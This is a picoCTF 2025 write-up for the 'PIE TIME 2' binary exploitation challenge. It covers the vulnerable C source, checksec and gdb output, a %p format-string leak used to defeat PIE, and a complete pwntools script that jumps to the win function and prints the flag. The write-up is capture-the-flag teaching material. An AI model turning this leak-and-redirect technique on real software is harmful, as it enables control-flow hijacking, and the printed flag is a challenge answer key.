# PIE TIME 2 #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2025, PIE, Format String 

## Description ##
Can you try to get the flag? I'm not revealing anything anymore!!

## Approach ##
I am provided with a binary file, `vuln`, and a c file, `vuln.c`. Inspecting the c file, I once again see `win` function that prints the flag, and `call_functions` function where it prints `buffer` where the user input is stored. I also see that the program casts user input to a function pointer and jumps to that address just like the previous "PIE TIME" challenge:

  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();

Since the `printf` function prints the contents of `buffer` without a format string, I can perform a format string attack to leak the address of `main` or `call_functions`. This allows me to calculate the base address and therefore figure out the address of `win`. As a habit, I check the security feature on the binary file using `checksec`:

    Arch:     amd64
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

As expected, PIE is enabled, which means I need to repeat what I did in the previous challenge. I found the offset of `main`, `call_functions`, and `win` using `objdump -d vuln`:

    0000000000001400 <main>:
    1400:       f3 0f 1e fa             endbr64
    1404:       55                      push   %rbp
                .
                .
                .
    144f:       00

    000000000000136a <win>:
    136a:       f3 0f 1e fa             endbr64
                .
                .
                .
    13ff:       c3                      ret

    00000000000012c7 <call_functions>:
    12c7:       f3 0f 1e fa             endbr64
    12ca:       55                      push   %rbp
                .
                .
                .
    1369:       c3                      ret

Then, I open up the binary file in gdb. I run the program and spam a bunch of `%p`:

    Enter your name:%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
    0x5555555592a1.0xfbad2288.0xaaaa6d5f.0x5555555592d9.0x410.0x7fffffffdc40.0x7ffff7c92415.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xa.(nil).0xf53e2b7c06e91a00.0x7fffffffdc90.0x555555555441

I can see that at positon 19, I get an address similar to `main`. To further confirm that this is `main`, I disas main in gdb:

   Dump of assembler code for function main:
   0x0000555555555400 <+0>:     endbr64
   0x0000555555555404 <+4>:     push   rbp
   0x0000555555555405 <+5>:     mov    rbp,rsp
   0x0000555555555408 <+8>:     lea    rsi,[rip+0xfffffffffffffe9a]        # 0x5555555552a9 <segfault_handler>
   0x000055555555540f <+15>:    mov    edi,0xb
   0x0000555555555414 <+20>:    call   0x555555555170 <signal@plt>
   0x0000555555555419 <+25>:    mov    rax,QWORD PTR [rip+0x2bf0]        # 0x555555558010 <stdout@@GLIBC_2.2.5>
   0x0000555555555420 <+32>:    mov    ecx,0x0
   0x0000555555555425 <+37>:    mov    edx,0x2
   0x000055555555542a <+42>:    mov    esi,0x0
   0x000055555555542f <+47>:    mov    rdi,rax
   0x0000555555555432 <+50>:    call   0x555555555180 <setvbuf@plt>
   0x0000555555555437 <+55>:    mov    eax,0x0
   0x000055555555543c <+60>:    call   0x5555555552c7 <call_functions>
   0x0000555555555441 <+65>:    mov    eax,0x0
   0x0000555555555446 <+70>:    pop    rbp
   0x0000555555555447 <+71>:    ret

I see that the address I leaked is similar to `0x0000555555555441 <+65>:    mov    eax,0x0`. So I knew that this must be `main` address (Note: It maybe possible to find leaked address of `call_functions`, but since I found `main` first, I used that to calculate the base address). Now that I have all the information I need, I started to write a payload script:

    from pwn import *

    # PORT will vary
    HOST = "rescued-float.picoctf.net"
    PORT = 61020

    p = remote(HOST, PORT)

    #p = process('./vuln')

    p.recvuntil(b"Enter your name:")
    p.sendline(b"%19$p")

    # Get main address
    main_address = int(p.recvline().strip(), 16)

    print(f"Main Address: {hex(main_address)}")

    # Calculate base address and win address
    base_address = main_address - 0x1441
    win_address = hex(base_address + 0x136a)

    print(f"base address: {hex(base_address)}")
    print(f"win address: {win_address}")

    p.sendline(win_address)

    p.interactive()

When I run the script, I got the flag:

    [*] Switching to interactive mode
    enter the address to jump to, ex => 0x12345: You won!
    picoCTF{p13_5h0u1dn'7_134k_297076a0}

Flag: picoCTF{p13_5h0u1dn'7_134k_297076a0}

## Reflection ## 
This challenge shows how PIE can be defeated by leaking a single code pointer via a format string vulnerability. Since I have previous experience with format string attacks, I was able to identify the problem and easily figure out how to leak the main address and calculate the base address. This challenge also highlights how powerful information leaks can be, as even with multiple mitigations enabled, a single leaked pointer combined with an unsafe indirect function call is enough to fully redirect control flow.


